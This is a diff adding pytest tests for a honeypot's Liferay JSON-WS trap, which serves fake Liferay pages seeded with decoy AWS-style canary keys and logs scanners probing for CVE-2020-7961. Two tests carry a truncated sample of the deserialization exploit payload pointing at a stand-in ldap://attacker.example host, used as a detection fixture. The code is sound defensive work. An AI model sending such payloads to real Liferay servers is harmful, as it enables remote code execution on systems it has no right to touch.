@@ -553,6 +553,7 @@ def test_all_trap_families_default_on():
     assert tbenv.HNAP1_ENABLED
     assert tbenv.SERVER_STATUS_ENABLED
     assert tbenv.GEOSERVER_ENABLED
+    assert tbenv.LIFERAY_ENABLED
     assert tbenv.COLDFUSION_ENABLED
     assert tbenv.CONFLUENCE_ENABLED
     assert tbenv.SAP_METADATAUPLOADER_ENABLED
@@ -5490,6 +5491,204 @@ async def test_dispatch_geoserver_disabled_returns_404(flux_client, monkeypatch)
     monkeypatch.setattr(tbenv, "GEOSERVER_ENABLED", False)
     resp = await flux_client.get(
         "/geoserver/web/", headers={"X-Forwarded-For": "203.0.113.67"}
+    )
+    assert resp.status == 404
+    entries = _log_entries(flux_client.log_path)
+    assert entries[-1]["result"] == "not-handled"
+
+
+# --- Liferay JSON-WS trap (CVE-2020-7961 marshaller RCE bait) ---
+
+
+def test_liferay_enabled_by_default():
+    assert tbenv.LIFERAY_ENABLED
+
+
+def test_liferay_path_matches_landing_and_invoke():
+    must_match = [
+        "/api/jsonws",
+        "/api/jsonws/",
+        "/api/jsonws/invoke",
+        "/api/jsonws?serviceClassName=com.liferay.portal.service.UserService",
+        "/API/JSONWS",
+        "/api/jsonws/anything-else",
+    ]
+    for path in must_match:
+        assert tbenv.is_liferay_path(path), f"expected match: {path}"
+
+
+def test_liferay_path_does_not_match_unrelated_paths():
+    for path in [
+        "/",
+        "/api",
+        "/api/",
+        "/api/v4/user",
+        "/api/jsonwsX",      # no slash boundary, must not match
+        "/api/.env",
+        "/jsonws",
+    ]:
+        assert not tbenv.is_liferay_path(path), f"unexpected match: {path}"
+
+
+def test_liferay_disabled_returns_false(monkeypatch):
+    monkeypatch.setattr(tbenv, "LIFERAY_ENABLED", False)
+    assert not tbenv.is_liferay_path("/api/jsonws")
+
+
+def test_liferay_marshaller_indicators_detect_cve_2020_7961_payload():
+    payload = (
+        b'[{"className":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",'
+        b'"settings":{"userOverridesAsString":"HexAsciiSerializedMap:'
+        b'aced...ldap://attacker.example/Exploit"}}]'
+    )
+    assert tbenv._liferay_has_marshaller(payload) is True
+
+
+def test_liferay_marshaller_indicators_ignore_benign_invocation():
+    payload = b'[{"/user/get-user-by-email-address":{"emailAddress":"test@example.com"}}]'
+    assert tbenv._liferay_has_marshaller(payload) is False
+
+
+def test_liferay_marshaller_indicators_empty_body_is_false():
+    assert tbenv._liferay_has_marshaller(b"") is False
+
+
+def test_liferay_landing_embeds_canary_in_s3_config_block():
+    body = tbenv.render_liferay_jsonws_landing(
+        "victim.example", tbenv._aws(FAKE_TRACEBIT), "7.2.0 GA1", "7200",
+    ).decode("utf-8")
+    # Version banner pins the build so version-gated scanners proceed.
+    assert "Liferay" in body
+    assert "7.2.0 GA1" in body
+    # Canary key + secret in the S3-backed DLAppService description —
+    # the scanner-grep slot.
+    assert "AKIAFAKEEXAMPLE01" in body
+    assert "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
+    # Service catalog links scanners use to walk method signatures.
+    assert "DLAppService" in body
+    assert "/api/jsonws?serviceClassName=" in body
+
+
+def test_liferay_service_signature_embeds_canary_in_default_arg_slot():
+    body = tbenv.render_liferay_jsonws_service_signature(
+        "com.liferay.document.library.kernel.service.DLAppService",
+        tbenv._aws(FAKE_TRACEBIT),
+        "7.2.0 GA1",
+        "7200",
+    ).decode("utf-8")
+    catalog = json.loads(body)
+    assert catalog["context"] == "Liferay-Portal"
+    assert catalog["serviceClassName"].endswith("DLAppService")
+    s3 = catalog["methods"][0]["default"]
+    assert s3["accessKey"] == "AKIAFAKEEXAMPLE01"
+    assert s3["secretKey"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+
+
+async def test_dispatch_liferay_landing_returns_liferay_banner(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
+    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
+
+    resp = await flux_client.get(
+        "/api/jsonws", headers={"X-Forwarded-For": "203.0.113.91"},
+    )
+    assert resp.status == 200
+    assert resp.headers.get("Content-Type", "").startswith("text/html")
+    assert "Liferay" in resp.headers.get("Liferay-Portal", "")
+    text = await resp.text()
+    assert "AKIAFAKEEXAMPLE01" in text
+    assert "JSON Web Services API" in text
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "liferay-jsonws-landing"
+    assert entry["liferayHasMarshallerPayload"] is False
+    assert "aws" in entry["canaryTypes"]
+
+
+async def test_dispatch_liferay_service_signature_returns_json_catalog(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
+    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
+
+    resp = await flux_client.get(
+        "/api/jsonws?serviceClassName=com.liferay.document.library.kernel.service.DLAppService",
+        headers={"X-Forwarded-For": "203.0.113.92"},
+    )
+    assert resp.status == 200
+    assert resp.headers.get("Content-Type", "").startswith("application/json")
+    catalog = json.loads(await resp.text())
+    assert catalog["serviceClassName"].endswith("DLAppService")
+    assert catalog["methods"][0]["default"]["accessKey"] == "AKIAFAKEEXAMPLE01"
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "liferay-jsonws-service-signature"
+    assert entry["liferayServiceClassName"].endswith("DLAppService")
+
+
+async def test_dispatch_liferay_invoke_captures_marshaller_payload(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
+    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
+
+    # Canonical CVE-2020-7961 marshaller payload shape.
+    payload = (
+        b'[{"className":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",'
+        b'"settings":{"userOverridesAsString":"HexAsciiSerializedMap:'
+        b'aced...ldap://attacker.example/Exploit"}}]'
+    )
+    resp = await flux_client.post(
+        "/api/jsonws/invoke",
+        data=payload,
+        headers={
+            "X-Forwarded-For": "203.0.113.93",
+            "Content-Type": "application/json",
+        },
+    )
+    assert resp.status == 500
+    text = await resp.text()
+    assert "JSONWebServiceInvocationException" in text
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "liferay-jsonws-invoke"
+    assert entry["liferayHasMarshallerPayload"] is True
+    # Payload preview is captured for triage but the full body still
+    # hashed via bodySha256 in the standard log row.
+    assert "ldap://" in entry["liferayPayloadPreview"]
+
+
+async def test_dispatch_liferay_keyless_still_serves_landing(flux_client, monkeypatch):
+    # Without TRACEBIT_API_KEY the canary slots go empty but the page
+    # still 200s so banner-grab scanners keep walking.
+    monkeypatch.setattr(tbenv, "API_KEY", "")
+    resp = await flux_client.get(
+        "/api/jsonws", headers={"X-Forwarded-For": "203.0.113.94"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "Liferay" in text
+    # No canary value rendered; the slot is still there for fingerprint.
+    assert "DLAppService" in text
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "liferay-jsonws-landing"
+    assert entry["canaryTypes"] == []
+
+
+async def test_dispatch_liferay_unknown_subpath_returns_liferay_404(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
+    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
+    resp = await flux_client.get(
+        "/api/jsonws/com.liferay.UnknownService/find-by-id",
+        headers={"X-Forwarded-For": "203.0.113.95"},
+    )
+    assert resp.status == 404
+    text = await resp.text()
+    assert "JSONWebServiceInvocationException" in text
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "liferay-jsonws-miss"
+
+
+async def test_dispatch_liferay_disabled_returns_404(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "LIFERAY_ENABLED", False)
+    resp = await flux_client.get(
+        "/api/jsonws", headers={"X-Forwarded-For": "203.0.113.96"},
     )
     assert resp.status == 404
     entries = _log_entries(flux_client.log_path)
